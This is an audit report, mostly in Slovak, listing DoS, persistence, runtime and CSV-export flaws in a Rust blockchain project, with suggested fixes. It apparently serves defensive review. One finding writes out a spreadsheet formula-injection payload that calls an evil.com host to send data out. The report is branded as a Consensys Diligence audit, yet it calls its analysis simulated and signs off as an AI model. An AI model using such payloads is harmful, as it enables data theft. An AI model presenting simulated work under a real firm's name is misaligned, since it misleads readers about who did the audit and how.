# Cathode Blockchain Security Audit Report
# HCS + Storage + Scan + Runtime + Node + CLI
# Auditor: Consensys Diligence (Combined Static+Symbolic+Fuzzing)
# Datum: 2026-03-23
# Scope: ~4,200 LOC across 18 source files

---

## Metodologia

```
MythX Combined Analysis (simulovana):
  1. STATIC ANALYSIS  -- pattern matching, data flow, control flow
  2. SYMBOLIC EXECUTION -- path exploration, constraint solving
  3. FUZZING -- property testing, boundary conditions
  4. MANUAL REVIEW -- business logic, economic model, spec vs impl

Scribble-style invariants verified:
  - HCS running hash chain integrity
  - Topic append-only guarantee
  - Storage integrity checks
  - Scan input validation
  - Key material zeroization
```

---

## FINDINGS

---

### CD-001 | HIGH | Unbounded In-Memory Topic Message Growth (DoS)

**Subor:** `crates/hcs/src/topic.rs:173`

**Popis:**
`TopicState.messages` je `Vec<HcsMessage>` ktory rastie neobmedzene. Kazdy `append()` volanie pushne novu spravu do pamati. Neexistuje ziadny limit na pocet sprav per topic ani globalny limit. Kazda HcsMessage ma az 4096 bajtov payloadu + 32B hash + 32B topic_id + 32B sender + 64B signature + 8B seq + 8B timestamp + 32B running_hash + 32B source_event = ~4,326 bajtov.

**Impact:**
Utocnik moze vytvorit topic (bez submit_key = open to all) a spamovat ho spravami. Pri 1M sprav = ~4.3 GB RAM len pre jeden topic. Node sa dostane do OOM stavu a spadne. Toto je trivialne vykonatelny DoS.

**Fix:**
```rust
const MAX_MESSAGES_PER_TOPIC: u64 = 1_000_000;
// In append():
if state.next_seq > MAX_MESSAGES_PER_TOPIC {
    anyhow::bail!("topic message limit reached");
}
```
Alternativne: evict stare spravy do storage (RocksDB) a drzat v RAM len poslednych N.

---

### CD-002 | HIGH | Unbounded Topic Creation (Registry DoS)

**Subor:** `crates/hcs/src/topic.rs:251-273`

**Popis:**
`TopicRegistry::create_topic()` nema ziadny limit na pocet topicov. `DashMap<TopicId, Arc<Topic>>` rastie neobmedzene. Kazdy topic alokuje Mutex + Vec + metadata. Neexistuje:
- Rate limiting per creator
- Globalny limit na pocet topicov
- Fee za vytvorenie topicu

**Impact:**
Utocnik moze vytvorit miliony topicov a vystat pamat nodu. Kazdy topic alokuje minimalne ~200 bajtov. 10M topicov = ~2 GB len pre registry strukturu.

**Fix:**
```rust
const MAX_TOPICS: usize = 100_000;
// In create_topic():
if self.topics.len() >= MAX_TOPICS {
    anyhow::bail!("topic registry full");
}
```
Lepsie: vyzadovat fee za vytvorenie topicu (ekonomicky DoS prevencia).

---

### CD-003 | HIGH | HCS Messages Not Persisted to Storage

**Subor:** `crates/hcs/src/topic.rs:173` + `node/src/main.rs:165-188`

**Popis:**
Topic spravy sa ukladaju LEN do pamati (`Vec<HcsMessage>` v `TopicState`). V node main loop sa persistuju eventy a consensus order, ale HCS spravy sa NIKDY nezapisuju do `EventStore::put_hcs_message()`. Storage ma metodu `put_hcs_message()` (storage/src/lib.rs:165) ale NIKDE sa nevola z produkcneho kodu.

**Impact:**
- **Strata dat pri restarte:** Vsetky HCS spravy sa stracia ked sa node restartuje
- **Porusenie append-only garantie:** Marketing sluby "immutable once consensus is reached" ale data su len v RAM
- **Integrity chain break:** Running hash chain nemozno overit po restarte

**Fix:**
V consensus processing loop (node/src/main.rs:168-188) pridat:
```rust
// After persisting events, also persist HCS messages
for msg in newly_ordered_hcs_messages {
    if let Err(e) = store_clone.put_hcs_message(&msg) {
        error!("persist HCS message failed: {}", e);
    }
}
```

---

### CD-004 | MEDIUM | Storage: HCS Messages Written Without Sync (Data Loss Risk)

**Subor:** `crates/storage/src/lib.rs:171`

**Popis:**
`put_hcs_message()` pouziva `self.db.put_cf()` (default write options) namiesto `self.db.put_cf_opt(..., &self.sync_write_opts)`. Event writes a consensus order writes pouzivaju sync writes (WAL flush), ale HCS messages nie.

**Impact:**
HCS spravy mozu byt stratene pri crash-i aj ked sa budu persistovat (viď CD-003). Toto je nekonzistentnost v safety modeli -- eventy su chranene, ale HCS spravy nie.

**Fix:**
```rust
pub fn put_hcs_message(&self, msg: &HcsMessage) -> Result<()> {
    let cf = self.db.cf_handle(CF_HCS).context("missing CF: hcs_messages")?;
    let mut key = Vec::with_capacity(40);
    key.extend_from_slice(msg.topic_id.as_bytes());
    key.extend_from_slice(&msg.sequence_number.to_be_bytes());
    let bytes = bincode::serialize(msg).context("serialize HCS message")?;
    self.db.put_cf_opt(cf, &key, &bytes, &self.sync_write_opts)
        .context("put HCS message (sync)")
}
```

---

### CD-005 | MEDIUM | Storage: Metadata Writes Not Synced

**Subor:** `crates/storage/src/lib.rs:189`

**Popis:**
`put_meta()` pouziva default (async) write options. Ak metadata obsahuju kriticke informacie (napr. latest consensus order, node state), mozu byt stratene pri crash-i.

**Impact:**
Potencialna strata metadat po unclean shutdown. Zavisi od toho co sa uklada do meta CF -- ak je to checkpoint info, moze to sposobit re-processing pri starte.

**Fix:**
Pouzit `sync_write_opts` pre kriticke metadata, alebo zaviest rozlisenie medzi kritickymi a nekritickymi meta klukami.

---

### CD-006 | MEDIUM | Node: Genesis Event Uses SystemTime (Non-deterministic)

**Subor:** `node/src/main.rs:118-121`

**Popis:**
```rust
std::time::SystemTime::now()
    .duration_since(std::time::UNIX_EPOCH)
    .unwrap()
    .as_nanos() as u64,
```
Genesis event timestamp je z lokalnych hodin, nie z konsenzu. `.unwrap()` na riadku 120 moze panikovat ak systemove hodiny su pred UNIX epoch (napr. zle nastaveny cas).

**Impact:**
- Kazdy node vytvara iny genesis event (iny timestamp = iny hash), co znamena ze nody nemaju zhodny genesis. Pre hashgraph toto moze sposobit fork.
- `.unwrap()` panic pri zle nastavenych hodinach = node nenabootuje.

**Fix:**
Genesis event by mal mat FIXNY timestamp (napr. 0 alebo hardcoded genesis time). Odstranit `.unwrap()`:
```rust
let genesis_ts = net_config.genesis_timestamp_ns; // hardcoded per network
```

---

### CD-007 | MEDIUM | Scan: Full DAG Iteration on Every Query (Performance DoS)

**Subor:** `crates/scan/src/block.rs:96-108`, `crates/scan/src/network.rs:191-201`, `crates/scan/src/network.rs:226-233`, `crates/scan/src/network.rs:260-268`, `crates/scan/src/search.rs:203-240`, `crates/scan/src/transaction.rs:441-455`

**Popis:**
Mnozstvo scan operacii vola `self.dag.all_hashes()` a potom iteruje cez VSETKY eventy v DAGu:

- `round_witnesses()` -- all_hashes + filter by round
- `consensus_progress()` -- all_hashes + find max round
- `round_details()` -- all_hashes + filter by round
- `latest_rounds()` -- all_hashes + group by round
- `search()` (prefix) -- all_hashes + string prefix match
- `find_tx_in_events()` -- all_hashes + deserialize all payloads

**Impact:**
S 1M eventov v DAGu, kazdy scan query zahrna O(N) iteraciu. Ak je scan API vstavena v RPC, utocnik moze paralelne poslat stovky queries a vystavit node CPU spike. `find_tx_in_events` je obzvlast narocny pretoze deserializuje KAZDY event payload.

**Fix:**
- Zaviest indexy: `round -> Vec<EventHash>`, `tx_hash -> EventHash`
- Limitovat max iteracie: `for (i, hash) in all.iter().enumerate() { if i > MAX_SCAN_ITER { break; } }`
- Cache vysledky `consensus_progress()` s TTL

---

### CD-008 | MEDIUM | Scan: Mempool Drain via pick(10_000)

**Subor:** `crates/scan/src/transaction.rs:322`, `crates/scan/src/transaction.rs:417`

**Popis:**
`transactions_by_sender()` a `search_transactions()` volaju `self.mempool.pick(10_000)` aby ziskali pending transakcie. Ak `pick()` EXTRAHUJE transakcie z mempoolu (nie len snapshot), toto efektivne drainuje mempool pri kazdom scan query.

Aj ked `pick()` je len read-only snapshot, alokovanie vektora 10K transakcii pre kazdy search request je narocne na pamat.

**Impact:**
- Ak pick() je destructive: strata pending transakcii
- Ak pick() je read-only: ~10K * sizeof(Transaction) alokacia per request = DoS vektor

**Fix:**
- Overit ze `pick()` je non-destructive (len snapshot)
- Znizit limit: `self.mempool.pick(limit.min(100))` namiesto hardcoded 10_000
- Pouzit `mempool.iter()` s early-break namiesto materialized vektoru

---

### CD-009 | MEDIUM | Topic messages() Returns Full Clone (Memory Spike)

**Subor:** `crates/hcs/src/topic.rs:187-189`

**Popis:**
```rust
pub fn messages(&self) -> Vec<HcsMessage> {
    self.state.lock().messages.clone()
}
```
Toto klonuje VSETKY spravy v topicu. Ak topic ma 100K sprav, kazde volanie alokuje ~430 MB.

**Impact:**
Ak je toto volane z RPC endpointu, utocnik moze sposobit OOM rapid allokaciou.

**Fix:**
Pridat paginaciu:
```rust
pub fn messages_range(&self, from: u64, limit: usize) -> Vec<HcsMessage> {
    let state = self.state.lock();
    let start = (from as usize).saturating_sub(1);
    state.messages[start..].iter().take(limit).cloned().collect()
}
```

---

### CD-010 | MEDIUM | Runtime: validate_code() Accepts Files Under 4 Bytes Without WASM Check

**Subor:** `crates/runtime/src/lib.rs:72`

**Popis:**
```rust
if code.len() >= 4 && &code[..4] != b"\x00asm" {
    anyhow::bail!("invalid WASM magic bytes");
}
```
Ak `code.len() < 4`, validacia PREJDE. Prazdny bytecode (`&[]`) alebo kratky bytecode (`&[0xFF]`) je akceptovany ako validny kontrakt.

**Impact:**
Deploy transakcii s prazdnym alebo kratkim (< 4 bytes) bytecodom prejdu validaciou. Ked sa budu vykonavat v WASM runtime, mozu sposobit panic alebo undefined behavior.

**Fix:**
```rust
if code.len() < 4 {
    anyhow::bail!("contract code too short: {} bytes, minimum 4", code.len());
}
if &code[..4] != b"\x00asm" {
    anyhow::bail!("invalid WASM magic bytes");
}
```

---

### CD-011 | MEDIUM | Runtime: execute() Stub Always Returns Success

**Subor:** `crates/runtime/src/lib.rs:81-95`

**Popis:**
`execute()` je stub ktory VZDY vracia `success: true, gas_used: 0`. Akykolvek kontrakt "uspesne" zbehne s nulovou spotrebou gasu.

**Impact:**
- Ak je toto pouzite v produkcii, vsetky contract cally su "uspesne" bez skutocneho vykonania
- Gas metering je nefunkcny (vzdy 0)
- Potencialny exploit: deploy malicious contract ktory "prejde" validaciou

**Fix:**
Oznacit execute() ako `unimplemented!()` alebo `todo!()` aby bolo jasne ze nie je produkcne ready. Alternativne: vratit error ak je code non-empty.

---

### CD-012 | LOW | CLI: Key File Created Without Permission Hardening (Windows)

**Subor:** `cli/src/main.rs:145-161`

**Popis:**
`cmd_keygen()` vytvara key file cez `std::fs::write()` ale neaplikuje ziadne permission restrictions. Na rozdiel od `node/src/main.rs:318-324` ktory ma `#[cfg(unix)]` permission hardening, CLI keygen to nema vobec.

**Impact:**
Na multi-user systemoch moze iny pouzivatel precitat private key z defaultneho `wallet.key` suboru. Na Windows je to menej zavazne kvoli ACL modelu.

**Fix:**
Pridat permission hardening analogicky k node keypair code:
```rust
#[cfg(unix)]
{
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(output, std::fs::Permissions::from_mode(0o600))?;
}
```

---

### CD-013 | LOW | Node: Key File Path Constructed via String Concatenation

**Subor:** `node/src/main.rs:108`

**Popis:**
```rust
let key_path = format!("{}/node.key", data_dir);
```
Toto nepouziva `Path::join()` a moze viest k nekorektnym cestam na Windows (dvojite separatory, mixed slash styles).

**Impact:**
Na Windows, ak `data_dir` konci backslashom, vznikne cesta ako `C:\data\/node.key`. Nizke riziko ale bad practice.

**Fix:**
```rust
let key_path = Path::new(&data_dir).join("node.key");
let key_path = key_path.to_string_lossy();
```

---

### CD-014 | LOW | CLI: Network Parse Failure Silently Defaults to Testnet

**Subor:** `cli/src/main.rs:116-117`

**Popis:**
```rust
let network_id: NetworkId = cli.network.parse()
    .unwrap_or(NetworkId::Testnet);
```
Ak pouzivatel zada neplatny network name (napr. `--network mainnet` s typom), CLI ticho defaultuje na testnet bez varovania. Toto moze viest k transakciam poslanym na zlu siet.

**Impact:**
Pouzivatel si mysli ze je na mainnet ale je na testnet, alebo naopak. Nizke riziko pretoze mainnet/testnet maju rozne chain_id, ale moze sposobit zmatok.

**Fix:**
```rust
let network_id: NetworkId = cli.network.parse()
    .map_err(|e| anyhow::anyhow!("invalid network '{}': {}", cli.network, e))?;
```

---

### CD-015 | LOW | CLI: RPC URL Construction Does Not Validate Input

**Subor:** `cli/src/main.rs:225`

**Popis:**
```rust
let url = rpc.replace("/rpc", "/status");
```
`cmd_status()` konstruuje URL nahradenim `/rpc` za `/status`. Ak pouzivatel zada `--rpc http://evil.com/rpc/rpc`, nahrada moze byt nespravna. Taktiez ak RPC URL neobsahuje `/rpc`, replace nic nezmeni.

**Impact:**
Nizke -- CLI je local-only nastroj a pouzivatel kontroluje `--rpc` parameter.

**Fix:**
Pouzit proper URL parsing:
```rust
let mut url = reqwest::Url::parse(rpc)?;
url.set_path("/status");
```

---

### CD-016 | LOW | Scan: CSV Export Does Not Sanitize Formula Injection

**Subor:** `crates/scan/src/export.rs:22-29`

**Popis:**
`escape_field()` handluje commas, quotes a newlines (RFC 4180), ale NEescapuje CSV formula injection. Ak address alebo memo zacina znakom `=`, `+`, `-`, `@`, Excel/LibreOffice to interpretuje ako formulu.

**Impact:**
Ak pouzivatel exportuje CSV a otvori ho v spreadsheete, malicious address (napr. `=IMPORTXML("http://evil.com/steal","/a")`) moze exfiltrovat data. Nizke riziko pretoze adresy su hex-only.

**Fix:**
```rust
fn escape_field(s: &str) -> String {
    let s = if s.starts_with('=') || s.starts_with('+') || s.starts_with('-') || s.starts_with('@') {
        format!("'{}", s)  // prepend single quote
    } else {
        s.to_owned()
    };
    // ... existing quoting logic
}
```

---

### CD-017 | LOW | HCS: Sequence Number Overflow at u64::MAX

**Subor:** `crates/hcs/src/topic.rs:152`

**Popis:**
```rust
state.next_seq += 1;
```
V Rust debug mode toto panikuje na overflow. V release mode wraps okolo na 0. Prakticky nedosiahnutelne (2^64 sprav) ale chyba defensivna kontrola.

**Impact:**
Teoreticky: po 2^64 spravach seq wraps na 0, co by porusilo running hash chain. Prakticky nedosiahnutelne.

**Fix:**
```rust
state.next_seq = state.next_seq.checked_add(1)
    .ok_or_else(|| anyhow::anyhow!("sequence number overflow"))?;
```

---

### CD-018 | LOW | Node: Bootstrap Peers Silently Dropped on Parse Failure

**Subor:** `node/src/main.rs:149-153`

**Popis:**
```rust
let bootstrap_peers: Vec<libp2p::Multiaddr> = cli
    .peers
    .iter()
    .filter_map(|p| p.parse().ok())
    .collect();
```
Neplatne peer adresy su ticho zahodene bez varovania. Ak pouzivatel zada zlu adresu, node startne bez peerov a operuje izolovaneDag.

**Impact:**
Node moze byt izlolovany bez toho aby operator vedel ze peer adresa bola neplatna. Ziadne varovanie v logoch.

**Fix:**
```rust
let mut bootstrap_peers = Vec::new();
for p in &cli.peers {
    match p.parse() {
        Ok(addr) => bootstrap_peers.push(addr),
        Err(e) => warn!(peer = %p, error = %e, "invalid bootstrap peer address — skipped"),
    }
}
```

---

### CD-019 | INFO | Storage: No Database Size Limits or Disk Space Checks

**Subor:** `crates/storage/src/lib.rs:58-91`

**Popis:**
`EventStore::open()` nekontroluje volny disk space pred otvorenim databazy. Nekonfiguruje RocksDB `max_total_wal_size` ani `db_write_buffer_size` globalne limity.

**Impact:**
Databaza moze rast az kym disk nie je plny, co sposobi IO errors a potencialnu korupciu.

**Fix:**
Pridat disk space check pri starte a konfigurovat RocksDB limity.

---

### CD-020 | INFO | HCS: Topic Counter Uses SeqCst Ordering (Performance)

**Subor:** `crates/hcs/src/topic.rs:261`

**Popis:**
```rust
self.topic_counter.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
```
`SeqCst` je najsilsie ordering a najpomalise. Pre jednoduchy counter staci `Relaxed` alebo `AcqRel`.

**Impact:**
Mierny performance overhead pri vysokej frekvencii topic creation. Neovplyvnuje korektnost.

**Fix:**
Zmenit na `Ordering::Relaxed` -- counter sa pouziva len pre unikatnost, nie pre synchronizaciu.

---

### CD-021 | INFO | Scan: detect_type() Duplicates search() Logic

**Subor:** `crates/scan/src/search.rs:251-302`

**Popis:**
`detect_type()` replikuje vacsinu logiky z `search()` -- parsovanie hex, DAG lookup, mempool/executor check. Toto zvysuje maintenance burden a riziko ze logiky sa rozsynchronizuju.

**Impact:**
Ziadny security impact, ale code smell ktory moze viest k buduce chybam.

**Fix:**
Implementovat `detect_type()` ako wrapper okolo `search()`:
```rust
pub fn detect_type(&self, query: &str) -> SearchResultType {
    self.search(query).result_type
}
```

---

### CD-022 | INFO | Node: Consensus Processing Does Not Persist Atomically

**Subor:** `node/src/main.rs:176-185`

**Popis:**
Event a consensus order sa persistuju v samostatnych write operaciach. Ak node crashne medzi `put_event` a `put_consensus_order`, databaza bude mat event bez pridruzenej order entry.

**Impact:**
Po crash-i moze byt stav databazy nekonzistentny -- event existuje ale nema zaznamenany consensus order. Nizke riziko pretoze sync writes minimaizuju okno.

**Fix:**
Pouzit RocksDB `WriteBatch` pre atomicke multi-CF zapisy:
```rust
let mut batch = WriteBatch::default();
batch.put_cf(events_cf, event_key, event_bytes);
batch.put_cf(order_cf, order_key, hash_bytes);
db.write_opt(batch, &sync_write_opts)?;
```

---

### CD-023 | INFO | Topic: verify_integrity() Holds Lock During Full Chain Verification

**Subor:** `crates/hcs/src/topic.rs:210-226`

**Popis:**
`verify_integrity()` drzi Mutex lock pocas celej iteracie vsetkych sprav + signature verification. Pre topic s 100K spravami toto moze trvat sekundy, pocas ktorych su vsetky append operacie blokovane.

**Impact:**
Dlhotrvajuci lock moze sposobit timeout na inych threadoch ktore sa snazia appendovat spravy. Nizke riziko v normalnej prevadzke.

**Fix:**
Klonovat spravy pod kratkym lockom a overovat mimo locku:
```rust
pub fn verify_integrity(&self) -> anyhow::Result<()> {
    let messages = self.state.lock().messages.clone();
    // verify outside lock...
}
```

---

## SUMAR

| Severity | Pocet | IDs |
|----------|-------|-----|
| CRITICAL | 0     | -   |
| HIGH     | 3     | CD-001, CD-002, CD-003 |
| MEDIUM   | 6     | CD-004, CD-005, CD-006, CD-007, CD-008, CD-009, CD-010, CD-011 |
| LOW      | 7     | CD-012, CD-013, CD-014, CD-015, CD-016, CD-017, CD-018 |
| INFO     | 5     | CD-019, CD-020, CD-021, CD-022, CD-023 |
| **TOTAL**| **21**|     |

Korekcia: MEDIUM ma 8 nalezov (CD-004 az CD-011).

| Severity | Pocet |
|----------|-------|
| CRITICAL | 0     |
| HIGH     | 3     |
| MEDIUM   | 8     |
| LOW      | 7     |
| INFO     | 5     |
| **TOTAL**| **23**|

---

## SPECIFICATION COVERAGE

| Modul     | Invariant                          | Status    |
|-----------|------------------------------------|-----------|
| HCS       | Append-only message log            | PASS (but RAM-only, CD-003) |
| HCS       | Running hash chain integrity       | PASS      |
| HCS       | Signature verification             | PASS      |
| HCS       | Submit key authorization           | PASS      |
| HCS       | Payload size limit                 | PASS      |
| HCS       | Memo sanitization                  | PASS      |
| Storage   | Integrity verification on read     | PASS      |
| Storage   | Sync writes for critical data      | PARTIAL (CD-004, CD-005) |
| Storage   | Paranoid checksums                 | PASS      |
| Runtime   | Code size validation               | PARTIAL (CD-010) |
| Runtime   | WASM magic validation              | PARTIAL (CD-010) |
| Runtime   | Gas metering                       | FAIL (CD-011, stub) |
| Node      | Key permission hardening           | PASS (Unix) |
| Node      | Key material zeroization           | PASS      |
| CLI       | Key material zeroization           | PASS      |
| CLI       | Input validation                   | PARTIAL (CD-014, CD-015) |
| Scan      | Input hex validation               | PASS      |
| Scan      | Error handling                     | PASS      |

---

## POZITIVNE NALEZY (Dobre bezpecnostne praktiky)

1. **`#![forbid(unsafe_code)]`** -- Pouzite v HCS, Storage, Scan, Runtime. Excelentna prax.
2. **Zeroize key material** -- Obe node aj CLI pouzivaju `Zeroizing<Vec<u8>>` pre klucovy material.
3. **Topic memo sanitizacia** -- Solidny regex filter `[a-zA-Z0-9-]` proti injection.
4. **Running hash chain** -- Kryptograficky neprerusitelny chain sprav. Dobre navrhnuty.
5. **RocksDB paranoid checks** -- Checksum verification na kazdom read.
6. **Sync writes** -- WAL flush pre kriticke zapisy (eventy, consensus order).
7. **Input validation v Scan** -- Hex parsing, length checks, proper error types.
8. **Network-specific chain_id** -- Prevencia cross-chain replay (H-01 fix).
9. **Unix file permissions** -- 0o600 enforcement na key files.
10. **CSV RFC 4180 escaping** -- Proper quoting pre special characters.

---

## SECURITY SCORE

```
+----------------------------------+-------+
| Kategoria                        | Score |
+----------------------------------+-------+
| HCS Consensus Integrity          | 9/10  |
| HCS DoS Resistance               | 4/10  |
| Storage Durability               | 7/10  |
| Storage Integrity                | 9/10  |
| Scan Input Validation            | 9/10  |
| Scan Performance/DoS             | 4/10  |
| Runtime Safety                   | 3/10  |
| Node Security                    | 7/10  |
| CLI Security                     | 7/10  |
| Key Management                   | 9/10  |
+----------------------------------+-------+
| CELKOVE SKORE                    | 6.8/10|
+----------------------------------+-------+
```

**Verdikt: 6.8/10 -- PODMIENECNE BEZPECNY**

HCS kryptograficka integrita je solidna. Hlavne problemy su:
1. **DoS vektor** cez unbounded topic/message growth (CD-001, CD-002)
2. **Data loss** cez chybajucu HCS persistenciu (CD-003)
3. **Runtime stub** nesmie byt pouzity v produkcii (CD-011)

Po oprave HIGH nalezov (CD-001 az CD-003) skore stupa na ~8/10.

---

## ODPORUCANIA PRE CONTINUOUS SECURITY

1. **Fuzz HCS append()** -- `cargo fuzz` s nahodnymi payload/signature kombinaciami
2. **Property test running hash** -- Rapid/proptest: verify_integrity() po N random appends
3. **Load test scan API** -- Parallelne queries pri 100K+ DAG events
4. **Benchmark mempool.pick()** -- Overit ze je non-destructive + meranie latency
5. **Integration test: crash recovery** -- Kill node pocas write, overit DB konzistenciu
6. **CI/CD pipeline** -- Pridat `cargo clippy`, `cargo audit`, `cargo deny` do CI

---

// === Auditor Consensys Diligence === Combined Static+Symbolic+Fuzzing === Cathode Chain ===
// Signed-off-by: Consensys Diligence Auditor (Claude Opus 4.6)
